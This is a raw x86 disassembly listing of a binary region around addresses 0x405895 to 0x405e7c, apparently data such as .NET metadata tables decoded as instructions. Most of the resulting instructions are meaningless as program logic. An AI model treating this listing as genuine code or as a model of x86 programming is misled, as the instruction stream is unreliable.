  405895:	01 1b                	add    %ebx,(%ebx)
  405897:	14 00                	adc    $0x0,%al
  405899:	00 06                	add    %al,(%esi)
  40589b:	00 d1                	add    %dl,%cl
  40589d:	0f d4 04 06          	paddq  (%esi,%eax,1),%mm0
  4058a1:	00 7e 1e             	add    %bh,0x1e(%esi)
  4058a4:	d4 04                	aam    $0x4
  4058a6:	06                   	push   %es
  4058a7:	00 b9 12 d4 04 0a    	add    %bh,0xa04d412(%ecx)
  4058ad:	00 ea                	add    %ch,%dl
  4058af:	08 dc                	or     %bl,%ah
  4058b1:	15 06 00 ed 0e       	adc    $0xeed0006,%eax
  4058b6:	5c                   	pop    %esp
  4058b7:	11 06                	adc    %eax,(%esi)
  4058b9:	00 17                	add    %dl,(%edi)
  4058bb:	06                   	push   %es
  4058bc:	35 0e 0a 00 8d       	xor    $0x8d000a0e,%eax
  4058c1:	1d 49 18 06 00       	sbb    $0x61849,%eax
  4058c6:	27                   	daa
  4058c7:	1c 5c                	sbb    $0x5c,%al
  4058c9:	11 06                	adc    %eax,(%esi)
  4058cb:	00 d5                	add    %dl,%ch
  4058cd:	15 5c 11 0e 00       	adc    $0xe115c,%eax
  4058d2:	bb 0f d3 1b 0e       	mov    $0xe1bd30f,%ebx
  4058d7:	00 aa 18 d3 1b 0a    	add    %ch,0xa1bd318(%edx)
  4058dd:	00 9c 12 32 1b 0a 00 	add    %bl,0xa1b32(%edx,%edx,1)
  4058e4:	2a 1d 32 1b 0a 00    	sub    0xa1b32,%bl
  4058ea:	59                   	pop    %ecx
  4058eb:	0b 32                	or     (%edx),%esi
  4058ed:	1b 0a                	sbb    (%edx),%ecx
  4058ef:	00 6d 12             	add    %ch,0x12(%ebp)
  4058f2:	e9 06 06 00 6b       	jmp    0x6b405efd
  4058f7:	0e                   	push   %cs
  4058f8:	11 1d 06 00 3b 11    	adc    %ebx,0x113b0006
  4058fe:	d4 04                	aam    $0x4
  405900:	06                   	push   %es
  405901:	00 ec                	add    %ch,%ah
  405903:	13 d4                	adc    %esp,%edx
  405905:	04 06                	add    $0x6,%al
  405907:	00 4b 08             	add    %cl,0x8(%ebx)
  40590a:	5c                   	pop    %esp
  40590b:	11 0a                	adc    %ecx,(%edx)
  40590d:	00 08                	add    %cl,(%eax)
  40590f:	09 dc                	or     %ebx,%esp
  405911:	15 06 00 30 14       	adc    $0x14300006,%eax
  405916:	dc 15 06 00 f3 02    	fcoml  0x2f30006
  40591c:	5c                   	pop    %esp
  40591d:	11 12                	adc    %edx,(%edx)
  40591f:	00 33                	add    %dh,(%ebx)
  405921:	08 c6                	or     %al,%dh
  405923:	13 06                	adc    (%esi),%eax
  405925:	00 33                	add    %dh,(%ebx)
  405927:	02 25 05 0a 00 08    	add    0x8000a05,%ah
  40592d:	0f dc 15 0a 00 3e 1a 	paddusb 0x1a3e000a,%mm2
  405934:	0d 12 06 00 b5       	or     $0xb5000612,%eax
  405939:	02 5c 11 0a          	add    0xa(%ecx,%edx,1),%bl
  40593d:	00 0b                	add    %cl,(%ebx)
  40593f:	1e                   	push   %ds
  405940:	6b 1a 0a             	imul   $0xa,(%edx),%ebx
  405943:	00 02                	add    %al,(%edx)
  405945:	0b 6b 1a             	or     0x1a(%ebx),%ebp
  405948:	0a 00                	or     (%eax),%al
  40594a:	e4 0a                	in     $0xa,%al
  40594c:	6b 1a 06             	imul   $0x6,(%edx),%ebx
  40594f:	00 fb                	add    %bh,%bl
  405951:	14 d4                	adc    $0xd4,%al
  405953:	04 0a                	add    $0xa,%al
  405955:	00 3c 18             	add    %bh,(%eax,%ebx,1)
  405958:	32 1b                	xor    (%ebx),%bl
  40595a:	0a 00                	or     (%eax),%al
  40595c:	88 1e                	mov    %bl,(%esi)
  40595e:	32 1b                	xor    (%ebx),%bl
  405960:	06                   	push   %es
  405961:	00 d2                	add    %dl,%dl
  405963:	13 5c 11 0a          	adc    0xa(%ecx,%edx,1),%ebx
  405967:	00 93 1a 0d 12 06    	add    %dl,0x6120d1a(%ebx)
  40596d:	00 58 17             	add    %bl,0x17(%eax)
  405970:	d4 04                	aam    $0x4
  405972:	06                   	push   %es
  405973:	00 2c 13             	add    %ch,(%ebx,%edx,1)
  405976:	5c                   	pop    %esp
  405977:	11 06                	adc    %eax,(%esi)
  405979:	00 cc                	add    %cl,%ah
  40597b:	1e                   	push   %ds
  40597c:	73 10                	jae    0x40598e
  40597e:	06                   	push   %es
  40597f:	00 8d 10 73 10 06    	add    %cl,0x6107310(%ebp)
  405985:	00 b8 08 73 10 06    	add    %bh,0x6107308(%eax)
  40598b:	00 cb                	add    %cl,%bl
  40598d:	08 5c 11 06          	or     %bl,0x6(%ecx,%edx,1)
  405991:	00 33                	add    %dh,(%ebx)
  405993:	15 5c 11 06 00       	adc    $0x6115c,%eax
  405998:	cc                   	int3
  405999:	15 35 0e 06 00       	adc    $0x60e35,%eax
  40599e:	da 0a                	fimull (%edx)
  4059a0:	d4 04                	aam    $0x4
  4059a2:	06                   	push   %es
  4059a3:	00 9b 13 d4 04 06    	add    %bl,0x604d413(%ebx)
  4059a9:	00 6d 13             	add    %ch,0x13(%ebp)
  4059ac:	d4 04                	aam    $0x4
  4059ae:	0e                   	push   %cs
  4059af:	00 ca                	add    %cl,%dl
  4059b1:	10 d3                	adc    %dl,%bl
  4059b3:	1b 0e                	sbb    (%esi),%ecx
  4059b5:	00 b6 10 d3 1b 0e    	add    %dh,0xe1bd310(%esi)
  4059bb:	00 bb 18 d3 1b 0e    	add    %bh,0xe1bd318(%ebx)
  4059c1:	00 84 18 d3 1b 06 00 	add    %al,0x61bd3(%eax,%ebx,1)
  4059c8:	41                   	inc    %ecx
  4059c9:	02 f5                	add    %ch,%dh
  4059cb:	17                   	pop    %ss
  4059cc:	06                   	push   %es
  4059cd:	00 57 13             	add    %dl,0x13(%edi)
  4059d0:	54                   	push   %esp
  4059d1:	16                   	push   %ss
  4059d2:	00 00                	add    %al,(%eax)
  4059d4:	00 00                	add    %al,(%eax)
  4059d6:	27                   	daa
  4059d7:	04 00                	add    $0x0,%al
  4059d9:	00 00                	add    %al,(%eax)
  4059db:	00 01                	add    %al,(%ecx)
  4059dd:	00 01                	add    %al,(%ecx)
  4059df:	00 81 01 10 00 e6    	add    %al,-0x19ffefff(%ecx)
  4059e5:	11 00                	adc    %eax,(%eax)
  4059e7:	00 4d 00             	add    %cl,0x0(%ebp)
  4059ea:	01 00                	add    %eax,(%eax)
  4059ec:	01 00                	add    %eax,(%eax)
  4059ee:	81 01 10 00 a2 19    	addl   $0x19a20010,(%ecx)
  4059f4:	00 00                	add    %al,(%eax)
  4059f6:	4d                   	dec    %ebp
  4059f7:	00 01                	add    %al,(%ecx)
  4059f9:	00 02                	add    %al,(%edx)
  4059fb:	00 81 01 10 00 42    	add    %al,0x42001001(%ecx)
  405a01:	1e                   	push   %ds
  405a02:	00 00                	add    %al,(%eax)
  405a04:	4d                   	dec    %ebp
  405a05:	00 01                	add    %al,(%ecx)
  405a07:	00 06                	add    %al,(%esi)
  405a09:	00 81 01 10 00 8e    	add    %al,-0x71ffefff(%ecx)
  405a0f:	19 00                	sbb    %eax,(%eax)
  405a11:	00 4d 00             	add    %cl,0x0(%ebp)
  405a14:	01 00                	add    %eax,(%eax)
  405a16:	07                   	pop    %es
  405a17:	00 81 01 10 00 14    	add    %al,0x14001001(%ecx)
  405a1d:	11 00                	adc    %eax,(%eax)
  405a1f:	00 4d 00             	add    %cl,0x0(%ebp)
  405a22:	01 00                	add    %eax,(%eax)
  405a24:	09 00                	or     %eax,(%eax)
  405a26:	81 01 10 00 32 06    	addl   $0x6320010,(%ecx)
  405a2c:	00 00                	add    %al,(%eax)
  405a2e:	4d                   	dec    %ebp
  405a2f:	00 01                	add    %al,(%ecx)
  405a31:	00 0b                	add    %cl,(%ebx)
  405a33:	00 01                	add    %al,(%ecx)
  405a35:	00 10                	add    %dl,(%eax)
  405a37:	00 3d 13 00 00 4d    	add    %bh,0x4d000013
  405a3d:	00 03                	add    %al,(%ebx)
  405a3f:	00 0f                	add    %cl,(%edi)
  405a41:	00 81 01 10 00 ff    	add    %al,-0xffefff(%ecx)
  405a47:	0f 00 00             	sldt   (%eax)
  405a4a:	4d                   	dec    %ebp
  405a4b:	00 07                	add    %al,(%edi)
  405a4d:	00 18                	add    %bl,(%eax)
  405a4f:	00 81 01 10 00 ad    	add    %al,-0x52ffefff(%ecx)
  405a55:	19 00                	sbb    %eax,(%eax)
  405a57:	00 4d 00             	add    %cl,0x0(%ebp)
  405a5a:	07                   	pop    %es
  405a5b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405a5e:	81 01 10 00 c2 07    	addl   $0x7c20010,(%ecx)
  405a64:	00 00                	add    %al,(%eax)
  405a66:	4d                   	dec    %ebp
  405a67:	00 07                	add    %al,(%edi)
  405a69:	00 20                	add    %ah,(%eax)
  405a6b:	00 81 01 10 00 ce    	add    %al,-0x31ffefff(%ecx)
  405a71:	19 00                	sbb    %eax,(%eax)
  405a73:	00 4d 00             	add    %cl,0x0(%ebp)
  405a76:	07                   	pop    %es
  405a77:	00 21                	add    %ah,(%ecx)
  405a79:	00 81 01 10 00 4f    	add    %al,0x4f001001(%ecx)
  405a7f:	04 00                	add    $0x0,%al
  405a81:	00 4d 00             	add    %cl,0x0(%ebp)
  405a84:	08 00                	or     %al,(%eax)
  405a86:	24 00                	and    $0x0,%al
  405a88:	81 01 10 00 84 19    	addl   $0x19840010,(%ecx)
  405a8e:	00 00                	add    %al,(%eax)
  405a90:	4d                   	dec    %ebp
  405a91:	00 09                	add    %cl,(%ecx)
  405a93:	00 27                	add    %ah,(%edi)
  405a95:	00 80 01 10 00 fe    	add    %al,-0x1ffefff(%eax)
  405a9b:	0e                   	push   %cs
  405a9c:	78 11                	js     0x405aaf
  405a9e:	4d                   	dec    %ebp
  405a9f:	00 09                	add    %cl,(%ecx)
  405aa1:	00 28                	add    %ch,(%eax)
  405aa3:	00 80 01 10 00 72    	add    %al,0x72001001(%eax)
  405aa9:	07                   	pop    %es
  405aaa:	78 11                	js     0x405abd
  405aac:	4d                   	dec    %ebp
  405aad:	00 0e                	add    %cl,(%esi)
  405aaf:	00 33                	add    %dh,(%ebx)
  405ab1:	00 80 01 10 00 28    	add    %al,0x28001001(%eax)
  405ab7:	06                   	push   %es
  405ab8:	78 11                	js     0x405acb
  405aba:	4d                   	dec    %ebp
  405abb:	00 0f                	add    %cl,(%edi)
  405abd:	00 37                	add    %dh,(%edi)
  405abf:	00 80 01 10 00 c5    	add    %al,-0x3affefff(%eax)
  405ac5:	07                   	pop    %es
  405ac6:	78 11                	js     0x405ad9
  405ac8:	4d                   	dec    %ebp
  405ac9:	00 17                	add    %dl,(%edi)
  405acb:	00 42 00             	add    %al,0x0(%edx)
  405ace:	80 01 10             	addb   $0x10,(%ecx)
  405ad1:	00 42 11             	add    %al,0x11(%edx)
  405ad4:	78 11                	js     0x405ae7
  405ad6:	4d                   	dec    %ebp
  405ad7:	00 1a                	add    %bl,(%edx)
  405ad9:	00 4a 00             	add    %cl,0x0(%edx)
  405adc:	80 01 10             	addb   $0x10,(%ecx)
  405adf:	00 77 15             	add    %dh,0x15(%edi)
  405ae2:	78 11                	js     0x405af5
  405ae4:	4d                   	dec    %ebp
  405ae5:	00 1b                	add    %bl,(%ebx)
  405ae7:	00 4c 00 80          	add    %cl,-0x80(%eax,%eax,1)
  405aeb:	01 10                	add    %edx,(%eax)
  405aed:	00 f8                	add    %bh,%al
  405aef:	0f 78 11             	vmread %edx,(%ecx)
  405af2:	4d                   	dec    %ebp
  405af3:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405af6:	4f                   	dec    %edi
  405af7:	00 80 01 10 00 59    	add    %al,0x59001001(%eax)
  405afd:	0e                   	push   %cs
  405afe:	78 11                	js     0x405b11
  405b00:	4d                   	dec    %ebp
  405b01:	00 1f                	add    %bl,(%edi)
  405b03:	00 54 00 80          	add    %dl,-0x80(%eax,%eax,1)
  405b07:	01 10                	add    %edx,(%eax)
  405b09:	00 1e                	add    %bl,(%esi)
  405b0b:	06                   	push   %es
  405b0c:	78 11                	js     0x405b1f
  405b0e:	4d                   	dec    %ebp
  405b0f:	00 23                	add    %ah,(%ebx)
  405b11:	00 5a 00             	add    %bl,0x0(%edx)
  405b14:	00 01                	add    %al,(%ecx)
  405b16:	00 00                	add    %al,(%eax)
  405b18:	30 04 00             	xor    %al,(%eax,%eax,1)
  405b1b:	00 4d 00             	add    %cl,0x0(%ebp)
  405b1e:	23 00                	and    (%eax),%eax
  405b20:	5c                   	pop    %esp
  405b21:	00 03                	add    %al,(%ebx)
  405b23:	01 10                	add    %edx,(%eax)
  405b25:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405b28:	00 00                	add    %al,(%eax)
  405b2a:	4d                   	dec    %ebp
  405b2b:	00 25 00 5c 00 03    	add    %ah,0x3005c00
  405b31:	01 10                	add    %edx,(%eax)
  405b33:	00 01                	add    %al,(%ecx)
  405b35:	00 00                	add    %al,(%eax)
  405b37:	00 4d 00             	add    %cl,0x0(%ebp)
  405b3a:	27                   	daa
  405b3b:	00 5e 00             	add    %bl,0x0(%esi)
  405b3e:	03 01                	add    (%ecx),%eax
  405b40:	10 00                	adc    %al,(%eax)
  405b42:	9c                   	pushf
  405b43:	00 00                	add    %al,(%eax)
  405b45:	00 4d 00             	add    %cl,0x0(%ebp)
  405b48:	29 00                	sub    %eax,(%eax)
  405b4a:	61                   	popa
  405b4b:	00 03                	add    %al,(%ebx)
  405b4d:	01 10                	add    %edx,(%eax)
  405b4f:	00 ce                	add    %cl,%dh
  405b51:	00 00                	add    %al,(%eax)
  405b53:	00 4d 00             	add    %cl,0x0(%ebp)
  405b56:	2a 00                	sub    (%eax),%al
  405b58:	63 00                	arpl   %eax,(%eax)
  405b5a:	03 01                	add    (%ecx),%eax
  405b5c:	10 00                	adc    %al,(%eax)
  405b5e:	e3 00                	jecxz  0x405b60
  405b60:	00 00                	add    %al,(%eax)
  405b62:	4d                   	dec    %ebp
  405b63:	00 2b                	add    %ch,(%ebx)
  405b65:	00 65 00             	add    %ah,0x0(%ebp)
  405b68:	03 21                	add    (%ecx),%esp
  405b6a:	10 00                	adc    %al,(%eax)
  405b6c:	1d 05 00 00 4d       	sbb    $0x4d000005,%eax
  405b71:	00 2d 00 68 00 03    	add    %ch,0x3006800
  405b77:	01 10                	add    %edx,(%eax)
  405b79:	00 71 00             	add    %dh,0x0(%ecx)
  405b7c:	00 00                	add    %al,(%eax)
  405b7e:	4d                   	dec    %ebp
  405b7f:	00 2f                	add    %ch,(%edi)
  405b81:	00 6b 00             	add    %ch,0x0(%ebx)
  405b84:	03 01                	add    (%ecx),%eax
  405b86:	10 00                	adc    %al,(%eax)
  405b88:	ce                   	into
  405b89:	00 00                	add    %al,(%eax)
  405b8b:	00 4d 00             	add    %cl,0x0(%ebp)
  405b8e:	31 00                	xor    %eax,(%eax)
  405b90:	6d                   	insl   (%dx),%es:(%edi)
  405b91:	00 03                	add    %al,(%ebx)
  405b93:	01 10                	add    %edx,(%eax)
  405b95:	00 ba 01 00 00 4d    	add    %bh,0x4d000001(%edx)
  405b9b:	00 33                	add    %dh,(%ebx)
  405b9d:	00 6e 00             	add    %ch,0x0(%esi)
  405ba0:	03 01                	add    (%ecx),%eax
  405ba2:	10 00                	adc    %al,(%eax)
  405ba4:	d0 03                	rolb   $1,(%ebx)
  405ba6:	00 00                	add    %al,(%eax)
  405ba8:	e1 00                	loope  0x405baa
  405baa:	35 00 70 00 03       	xor    $0x3007000,%eax
  405baf:	01 10                	add    %edx,(%eax)
  405bb1:	00 8a 03 00 00 e1    	add    %cl,-0x1efffffd(%edx)
  405bb7:	00 3d 00 72 00 03    	add    %bh,0x3007200
  405bbd:	21 10                	and    %edx,(%eax)
  405bbf:	00 1d 05 00 00 4d    	add    %bl,0x4d000005
  405bc5:	00 42 00             	add    %al,0x0(%edx)
  405bc8:	74 00                	je     0x405bca
  405bca:	03 01                	add    (%ecx),%eax
  405bcc:	10 00                	adc    %al,(%eax)
  405bce:	1a 02                	sbb    (%edx),%al
  405bd0:	00 00                	add    %al,(%eax)
  405bd2:	e1 00                	loope  0x405bd4
  405bd4:	44                   	inc    %esp
  405bd5:	00 77 00             	add    %dh,0x0(%edi)
  405bd8:	03 21                	add    (%ecx),%esp
  405bda:	10 00                	adc    %al,(%eax)
  405bdc:	1d 05 00 00 4d       	sbb    $0x4d000005,%eax
  405be1:	00 47 00             	add    %al,0x0(%edi)
  405be4:	79 00                	jns    0x405be6
  405be6:	03 01                	add    (%ecx),%eax
  405be8:	10 00                	adc    %al,(%eax)
  405bea:	6c                   	insb   (%dx),%es:(%edi)
  405beb:	03 00                	add    (%eax),%eax
  405bed:	00 e1                	add    %ah,%cl
  405bef:	00 49 00             	add    %cl,0x0(%ecx)
  405bf2:	7c 00                	jl     0x405bf4
  405bf4:	03 21                	add    (%ecx),%esp
  405bf6:	10 00                	adc    %al,(%eax)
  405bf8:	1d 05 00 00 4d       	sbb    $0x4d000005,%eax
  405bfd:	00 4e 00             	add    %cl,0x0(%esi)
  405c00:	7e 00                	jle    0x405c02
  405c02:	03 01                	add    (%ecx),%eax
  405c04:	10 00                	adc    %al,(%eax)
  405c06:	87 00                	xchg   %eax,(%eax)
  405c08:	00 00                	add    %al,(%eax)
  405c0a:	4d                   	dec    %ebp
  405c0b:	00 50 00             	add    %dl,0x0(%eax)
  405c0e:	81 00 03 01 10 00    	addl   $0x100103,(%eax)
  405c14:	b1 03                	mov    $0x3,%cl
  405c16:	00 00                	add    %al,(%eax)
  405c18:	e1 00                	loope  0x405c1a
  405c1a:	51                   	push   %ecx
  405c1b:	00 83 00 15 01 00    	add    %al,0x11500(%ebx)
  405c21:	00 0b                	add    %cl,(%ebx)
  405c23:	03 00                	add    (%eax),%eax
  405c25:	00 e1                	add    %ah,%cl
  405c27:	00 56 00             	add    %dl,0x0(%esi)
  405c2a:	85 00                	test   %eax,(%eax)
  405c2c:	15 01 00 00 7e       	adc    $0x7e000001,%eax
  405c31:	02 00                	add    (%eax),%al
  405c33:	00 e1                	add    %ah,%cl
  405c35:	00 56 00             	add    %dl,0x0(%esi)
  405c38:	85 00                	test   %eax,(%eax)
  405c3a:	03 01                	add    (%ecx),%eax
  405c3c:	10 00                	adc    %al,(%eax)
  405c3e:	da 05 00 00 e1 00    	fiaddl 0xe10000
  405c44:	56                   	push   %esi
  405c45:	00 85 00 03 01 10    	add    %al,0x10010300(%ebp)
  405c4b:	00 af 05 00 00 e1    	add    %ch,-0x1efffffb(%edi)
  405c51:	00 5e 00             	add    %bl,0x0(%esi)
  405c54:	87 00                	xchg   %eax,(%eax)
  405c56:	03 01                	add    (%ecx),%eax
  405c58:	10 00                	adc    %al,(%eax)
  405c5a:	c0 05 00 00 e1 00 62 	rolb   $0x62,0xe10000
  405c61:	00 89 00 11 00 50    	add    %cl,0x50001100(%ecx)
  405c67:	07                   	pop    %es
  405c68:	aa                   	stos   %al,%es:(%edi)
  405c69:	07                   	pop    %es
  405c6a:	11 00                	adc    %eax,(%eax)
  405c6c:	b9 0e ae 07 51       	mov    $0x5107ae0e,%ecx
  405c71:	80 de 04             	sbb    $0x4,%dh
  405c74:	b1 07                	mov    $0x7,%cl
  405c76:	51                   	push   %ecx
  405c77:	80 00 05             	addb   $0x5,(%eax)
  405c7a:	b1 07                	mov    $0x7,%cl
  405c7c:	51                   	push   %ecx
  405c7d:	80 6a 04 b1          	subb   $0xb1,0x4(%edx)
  405c81:	07                   	pop    %es
  405c82:	51                   	push   %ecx
  405c83:	80 53 04 b1          	adcb   $0xb1,0x4(%ebx)
  405c87:	07                   	pop    %es
  405c88:	51                   	push   %ecx
  405c89:	80 f1 04             	xor    $0x4,%cl
  405c8c:	b1 07                	mov    $0x7,%cl
  405c8e:	11 00                	adc    %eax,(%eax)
  405c90:	9f                   	lahf
  405c91:	14 b4                	adc    $0xb4,%al
  405c93:	07                   	pop    %es
  405c94:	31 00                	xor    %eax,(%eax)
  405c96:	16                   	push   %ss
  405c97:	17                   	pop    %ss
  405c98:	b8 07 31 00 49       	mov    $0x49003107,%eax
  405c9d:	19 b8 07 31 00 18    	sbb    %edi,0x18003107(%eax)
  405ca3:	19 b8 07 31 00 26    	sbb    %edi,0x26003107(%eax)
  405ca9:	18 b8 07 31 00 b3    	sbb    %bh,-0x4cffcef9(%eax)
  405caf:	17                   	pop    %ss
  405cb0:	b8 07 31 00 d7       	mov    $0xd7003107,%eax
  405cb5:	18 b8 07 31 00 50    	sbb    %bh,0x50003107(%eax)
  405cbb:	07                   	pop    %es
  405cbc:	aa                   	stos   %al,%es:(%edi)
  405cbd:	07                   	pop    %es
  405cbe:	31 00                	xor    %eax,(%eax)
  405cc0:	2b 17                	sub    (%edi),%edx
  405cc2:	b8 07 51 80 0c       	mov    $0xc805107,%eax
  405cc7:	18 bc 07 51 80 2f 1c 	sbb    %bh,0x1c2f8051(%edi,%eax,1)
  405cce:	bc 07 11 00 67       	mov    $0x67001107,%esp
  405cd3:	1a bf 07 11 00 b5    	sbb    -0x4affeef9(%edi),%bh
  405cd9:	14 20                	adc    $0x20,%al
  405cdb:	04 11                	add    $0x11,%al
  405cdd:	00 6a 19             	add    %ch,0x19(%edx)
  405ce0:	20 04 31             	and    %al,(%ecx,%esi,1)
  405ce3:	00 51 1b             	add    %dl,0x1b(%ecx)
  405ce6:	c4 07                	les    (%edi),%eax
  405ce8:	31 00                	xor    %eax,(%eax)
  405cea:	eb 18                	jmp    0x405d04
  405cec:	b8 07 31 00 c2       	mov    $0xc2003107,%eax
  405cf1:	09 20                	or     %esp,(%eax)
  405cf3:	04 11                	add    $0x11,%al
  405cf5:	00 50 07             	add    %dl,0x7(%eax)
  405cf8:	aa                   	stos   %al,%es:(%edi)
  405cf9:	07                   	pop    %es
  405cfa:	11 00                	adc    %eax,(%eax)
  405cfc:	50                   	push   %eax
  405cfd:	07                   	pop    %es
  405cfe:	aa                   	stos   %al,%es:(%edi)
  405cff:	07                   	pop    %es
  405d00:	31 00                	xor    %eax,(%eax)
  405d02:	df 17                	fists  (%edi)
  405d04:	b8 07 31 00 50       	mov    $0x50003107,%eax
  405d09:	07                   	pop    %es
  405d0a:	aa                   	stos   %al,%es:(%edi)
  405d0b:	07                   	pop    %es
  405d0c:	11 00                	adc    %eax,(%eax)
  405d0e:	96                   	xchg   %eax,%esi
  405d0f:	0e                   	push   %cs
  405d10:	ae                   	scas   %es:(%edi),%al
  405d11:	07                   	pop    %es
  405d12:	11 00                	adc    %eax,(%eax)
  405d14:	67 1a bf 07 31       	sbb    0x3107(%bx),%bh
  405d19:	00 44 0f 20          	add    %al,0x20(%edi,%ecx,1)
  405d1d:	04 31                	add    $0x31,%al
  405d1f:	00 50 07             	add    %dl,0x7(%eax)
  405d22:	aa                   	stos   %al,%es:(%edi)
  405d23:	07                   	pop    %es
  405d24:	31 00                	xor    %eax,(%eax)
  405d26:	fb                   	sti
  405d27:	18 b8 07 11 00 67    	sbb    %bh,0x67001107(%eax)
  405d2d:	1a bf 07 33 01 76    	sbb    0x76013307(%edi),%bh
  405d33:	04 c8                	add    $0xc8,%al
  405d35:	07                   	pop    %es
  405d36:	33 01                	xor    (%ecx),%eax
  405d38:	e2 03                	loop   0x405d3d
  405d3a:	cd 07                	int    $0x7
  405d3c:	06                   	push   %es
  405d3d:	00 3a                	add    %bh,(%edx)
  405d3f:	07                   	pop    %es
  405d40:	d2 07                	rolb   %cl,(%edi)
  405d42:	06                   	push   %es
  405d43:	00 f8                	add    %bh,%al
  405d45:	00 d6                	add    %dl,%dh
  405d47:	07                   	pop    %es
  405d48:	06                   	push   %es
  405d49:	00 d7                	add    %dl,%bh
  405d4b:	13 20                	adc    (%eax),%esp
  405d4d:	04 06                	add    $0x6,%al
  405d4f:	00 21                	add    %ah,(%ecx)
  405d51:	05 20 04 06 00       	add    $0x60420,%eax
  405d56:	eb 09                	jmp    0x405d61
  405d58:	20 04 06             	and    %al,(%esi,%eax,1)
  405d5b:	00 eb                	add    %ch,%bl
  405d5d:	09 20                	or     %esp,(%eax)
  405d5f:	04 06                	add    $0x6,%al
  405d61:	00 a8 14 20 04 06    	add    %ch,0x6042014(%eax)
  405d67:	00 b0 10 20 04 36    	add    %dh,0x36042010(%eax)
  405d6d:	00 23                	add    %ah,(%ebx)
  405d6f:	04 da                	add    $0xda,%al
  405d71:	07                   	pop    %es
  405d72:	16                   	push   %ss
  405d73:	00 b1 00 de 07 06    	add    %dh,0x607de00(%ecx)
  405d79:	00 b4 13 20 04 06 00 	add    %dh,0x60420(%ebx,%edx,1)
  405d80:	4f                   	dec    %edi
  405d81:	0f 20 04             	mov    %cr0,%esp
  405d84:	06                   	push   %es
  405d85:	00 e9                	add    %ch,%cl
  405d87:	07                   	pop    %es
  405d88:	20 04 06             	and    %al,(%esi,%eax,1)
  405d8b:	00 52 14             	add    %dl,0x14(%edx)
  405d8e:	e3 07                	jecxz  0x405d97
  405d90:	06                   	push   %es
  405d91:	00 b4 13 20 04 06 00 	add    %dh,0x60420(%ebx,%edx,1)
  405d98:	6e                   	outsb  %ds:(%esi),(%dx)
  405d99:	02 e8                	add    %al,%ch
  405d9b:	07                   	pop    %es
  405d9c:	06                   	push   %es
  405d9d:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405da3:	00 0e                	add    %cl,(%esi)
  405da5:	14 ed                	adc    $0xed,%al
  405da7:	07                   	pop    %es
  405da8:	01 00                	add    %eax,(%eax)
  405daa:	cf                   	iret
  405dab:	01 e8                	add    %ebp,%eax
  405dad:	07                   	pop    %es
  405dae:	01 00                	add    %eax,(%eax)
  405db0:	ec                   	in     (%dx),%al
  405db1:	02 f2                	add    %dl,%dh
  405db3:	07                   	pop    %es
  405db4:	01 00                	add    %eax,(%eax)
  405db6:	d2 02                	rolb   %cl,(%edx)
  405db8:	20 04 01             	and    %al,(%ecx,%eax,1)
  405dbb:	00 39                	add    %bh,(%ecx)
  405dbd:	03 f7                	add    %edi,%esi
  405dbf:	07                   	pop    %es
  405dc0:	01 00                	add    %eax,(%eax)
  405dc2:	25 02 01 08 01       	and    $0x1080102,%eax
  405dc7:	00 59 03             	add    %bl,0x3(%ecx)
  405dca:	bc 07 06 00 83       	mov    $0x83000607,%esp
  405dcf:	0b bc 07 06 00 0e 14 	or     0x140e0006(%edi,%eax,1),%edi
  405dd6:	ed                   	in     (%dx),%eax
  405dd7:	07                   	pop    %es
  405dd8:	06                   	push   %es
  405dd9:	00 b4 13 20 04 06 00 	add    %dh,0x60420(%ebx,%edx,1)
  405de0:	4f                   	dec    %edi
  405de1:	0f 20 04             	mov    %cr0,%esp
  405de4:	01 00                	add    %eax,(%eax)
  405de6:	25 02 01 08 36       	and    $0x36080102,%eax
  405deb:	00 23                	add    %ah,(%ebx)
  405ded:	04 06                	add    $0x6,%al
  405def:	08 16                	or     %dl,(%esi)
  405df1:	00 17                	add    %dl,(%edi)
  405df3:	00 d6                	add    %dl,%dh
  405df5:	07                   	pop    %es
  405df6:	06                   	push   %es
  405df7:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405dfd:	00 0e                	add    %cl,(%esi)
  405dff:	14 ed                	adc    $0xed,%al
  405e01:	07                   	pop    %es
  405e02:	01 00                	add    %eax,(%eax)
  405e04:	25 02 01 08 36       	and    $0x36080102,%eax
  405e09:	00 23                	add    %ah,(%ebx)
  405e0b:	04 0b                	add    $0xb,%al
  405e0d:	08 16                	or     %dl,(%esi)
  405e0f:	00 17                	add    %dl,(%edi)
  405e11:	00 10                	add    %dl,(%eax)
  405e13:	08 06                	or     %al,(%esi)
  405e15:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405e1b:	00 0e                	add    %cl,(%esi)
  405e1d:	14 ed                	adc    $0xed,%al
  405e1f:	07                   	pop    %es
  405e20:	01 00                	add    %eax,(%eax)
  405e22:	df 02                	filds  (%edx)
  405e24:	1a 08                	sbb    (%eax),%cl
  405e26:	01 00                	add    %eax,(%eax)
  405e28:	27                   	daa
  405e29:	03 1f                	add    (%edi),%ebx
  405e2b:	08 01                	or     %al,(%ecx)
  405e2d:	00 25 02 24 08 36    	add    %ah,0x36082402
  405e33:	00 23                	add    %ah,(%ebx)
  405e35:	04 2e                	add    $0x2e,%al
  405e37:	08 16                	or     %dl,(%esi)
  405e39:	00 51 00             	add    %dl,0x0(%ecx)
  405e3c:	10 08                	adc    %cl,(%eax)
  405e3e:	06                   	push   %es
  405e3f:	00 a6 08 20 04 06    	add    %ah,0x6042008(%esi)
  405e45:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405e4b:	00 0e                	add    %cl,(%esi)
  405e4d:	14 ed                	adc    $0xed,%al
  405e4f:	07                   	pop    %es
  405e50:	01 00                	add    %eax,(%eax)
  405e52:	63 02                	arpl   %eax,(%edx)
  405e54:	b8 07 01 00 00       	mov    $0x107,%eax
  405e59:	03 bc 07 01 00 25 02 	add    0x2250001(%edi,%eax,1),%edi
  405e60:	01 08                	add    %ecx,(%eax)
  405e62:	06                   	push   %es
  405e63:	00 83 0b bc 07 06    	add    %al,0x607bc0b(%ebx)
  405e69:	00 0e                	add    %cl,(%esi)
  405e6b:	14 ed                	adc    $0xed,%al
  405e6d:	07                   	pop    %es
  405e6e:	06                   	push   %es
  405e6f:	00 eb                	add    %ch,%bl
  405e71:	17                   	pop    %ss
  405e72:	f2 07                	repnz pop %es
  405e74:	01 00                	add    %eax,(%eax)
  405e76:	63 02                	arpl   %eax,(%edx)
  405e78:	33 08                	xor    (%eax),%ecx
  405e7a:	01 00                	add    %eax,(%eax)
  405e7c:	00 03                	add    %al,(%ebx)
